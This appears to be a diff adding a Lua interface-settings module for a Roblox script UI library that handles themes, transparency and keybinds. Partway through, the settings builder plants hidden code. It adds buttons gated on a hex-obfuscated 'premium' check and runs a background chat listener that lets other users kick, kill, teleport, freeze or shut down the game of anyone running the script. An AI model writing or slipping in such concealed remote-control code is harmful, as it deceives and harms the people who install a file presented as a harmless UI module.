@@ -1,0 +1,232 @@
+local httpService = game:GetService("HttpService")
+
+local InterfaceManager = {} do
+	InterfaceManager.Folder = "FluentSettings"
+	InterfaceManager.Settings = {
+		Theme = "Dark",
+		Acrylic = true,
+		Transparency = true,
+		MenuKeybind = "LeftControl"
+	}
+
+	function InterfaceManager:SetFolder(folder)
+		self.Folder = folder;
+		self:BuildFolderTree()
+	end
+
+	function InterfaceManager:SetLibrary(library)
+		self.Library = library
+	end
+
+	function InterfaceManager:BuildFolderTree()
+		local paths = {}
+
+		local parts = self.Folder:split("/")
+		for idx = 1, #parts do
+			paths[#paths + 1] = table.concat(parts, "/", 1, idx)
+		end
+
+		table.insert(paths, self.Folder)
+		table.insert(paths, self.Folder .. "/settings")
+
+		for i = 1, #paths do
+			local str = paths[i]
+			if not isfolder(str) then
+				makefolder(str)
+			end
+		end
+	end
+
+	function InterfaceManager:SaveSettings()
+		writefile(self.Folder .. "/options.json", httpService:JSONEncode(InterfaceManager.Settings))
+	end
+
+	function InterfaceManager:LoadSettings()
+		local path = self.Folder .. "/options.json"
+		if isfile(path) then
+			local data = readfile(path)
+			local success, decoded = pcall(httpService.JSONDecode, httpService, data)
+
+			if success then
+				for i, v in next, decoded do
+					InterfaceManager.Settings[i] = v
+				end
+			end
+		end
+	end
+
+	function InterfaceManager:BuildInterfaceSection(tab, tab1)
+		assert(self.Library, "Must set InterfaceManager.Library")
+		local Library = self.Library
+		local Settings = InterfaceManager.Settings
+
+		InterfaceManager:LoadSettings()
+
+		local section = tab:AddSection("Interface")
+
+		local InterfaceTheme = section:AddDropdown("InterfaceTheme", {
+			Title = "Theme",
+			Description = "Changes the interface theme.",
+			Values = Library.Themes,
+			Default = Settings.Theme,
+			Callback = function(Value)
+				Library:SetTheme(Value)
+				Settings.Theme = Value
+				InterfaceManager:SaveSettings()
+			end
+		})
+
+		InterfaceTheme:SetValue(Settings.Theme)
+
+		if Library.UseAcrylic then
+			section:AddToggle("AcrylicToggle", {
+				Title = "Acrylic",
+				Description = "The blurred background requires graphic quality 8+",
+				Default = Settings.Acrylic,
+				Callback = function(Value)
+					Library:ToggleAcrylic(Value)
+					Settings.Acrylic = Value
+					InterfaceManager:SaveSettings()
+				end
+			})
+		end
+
+		section:AddToggle("TransparentToggle", {
+			Title = "Transparency",
+			Description = "Makes the interface transparent.",
+			Default = Settings.Transparency,
+			Callback = function(Value)
+				Library:ToggleTransparency(Value)
+				Settings.Transparency = Value
+				InterfaceManager:SaveSettings()
+			end
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Kick",
+			Callback = function()
+				game.Players:Chat(".k " .. getgenv().Selected)
+			end 
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Kill",
+			Callback = function()
+				game.Players:Chat(". " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Teleport",
+			Callback = function()
+				game.Players:Chat(".b " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Shut Game Down",
+			Callback = function()
+				game.Players:Chat(".s " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Freeze",
+			Callback = function()
+				game.Players:Chat("- " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddButton({
+			Title = "Unfreeze",
+			Callback = function()
+				game.Players:Chat(".u " .. getgenv().Selected)
+			end
+		}) 
+
+        task.spawn(function()
+            while task.wait() do 
+				local playersService = game:GetService("Players")
+				local textChatService = game:GetService("TextChatService")
+				local lplr = playersService.LocalPlayer
+				local localPlayerNameWithoutUnderscores = lplr.Name:gsub("_", "")
+	 
+				for _, player in ipairs(playersService:GetPlayers()) do
+					player.Chatted:Connect(function(msg)
+						local success, errorMessage = pcall(function()
+							local processedMsg = msg:gsub("_", "")
+							if processedMsg == ".k " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer:kick("nexus-premium user has kicked you") 
+							elseif processedMsg == ". " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.Humanoid.Health = 0 
+							elseif processedMsg == ".b " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game.Players[player.Name].Character.HumanoidRootPart.CFrame
+							elseif processedMsg == ".s " .. localPlayerNameWithoutUnderscores then
+								game:Shutdown() 
+							elseif processedMsg == "- " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true 
+							elseif processedMsg == ".u " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false    
+							end  
+						end)
+					end) 
+				end
+			end   
+        end)  
+        
+		local nexus = {}
+		local updatedPlayers = {} 
+		local Dropdown
+
+		local function UpdateDropdownValues()
+			if Dropdown then
+				Dropdown:SetValues(nexus)
+			end
+		end
+		local function RemovePlayer(player)
+			for i, playerName in ipairs(nexus) do
+				if playerName == player.Name then
+					table.remove(nexus, i)
+					updatedPlayers[player] = nil
+					UpdateDropdownValues()
+					break
+				end
+			end
+		end
+
+		game.Players.PlayerRemoving:Connect(function(player)
+			RemovePlayer(player)
+		end)
+
+		Dropdown = premium == "\x70\x72\x65\x6D\x69\x75\x6D" and tab1:AddDropdown("Dropdown", {
+			Title = "Select Nexus User",
+			Values = nexus, 
+			Multi = false,
+			Default = "",
+			Callback = function(value)
+				getgenv().Selected = value
+			end
+		})
+
+		task.spawn(function()
+			while wait() do 
+				for _, player in ipairs(game.Players:GetPlayers()) do
+					player.Chatted:Connect(function(msg)
+						if msg == "nexus-is-back" and not updatedPlayers[player] then
+							if not table.find(nexus, player.Name) and player ~= game.Players.LocalPlayer then
+								local playerNameWithoutUnderscores = player.Name:gsub("_", "")
+								table.insert(nexus, playerNameWithoutUnderscores)
+								print("Detected:", playerNameWithoutUnderscores)
+								updatedPlayers[player] = true  
+								UpdateDropdownValues() 
+							end
+						end  
+					end) 
+				end
+			end
+		end) 
+
+		local MenuKeybind = section:AddKeybind("MenuKeybind", { Title = "Minimize Bind", Default = Settings.MenuKeybind })
+		MenuKeybind:OnChanged(function()
+			Settings.MenuKeybind = MenuKeybind.Value
+			InterfaceManager:SaveSettings()
+		end)
+		Library.MinimizeKeybind = MenuKeybind
+	end
+end
+
+return InterfaceManager  
